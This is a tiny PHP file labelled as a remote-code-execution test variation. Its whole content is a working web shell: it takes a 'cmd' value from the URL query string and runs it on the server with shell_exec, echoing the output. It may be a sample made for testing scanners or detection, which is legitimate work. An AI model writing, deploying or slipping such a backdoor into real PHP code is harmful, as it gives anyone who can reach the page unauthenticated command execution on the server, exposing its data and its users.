<?php
// RCE test variation #584
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>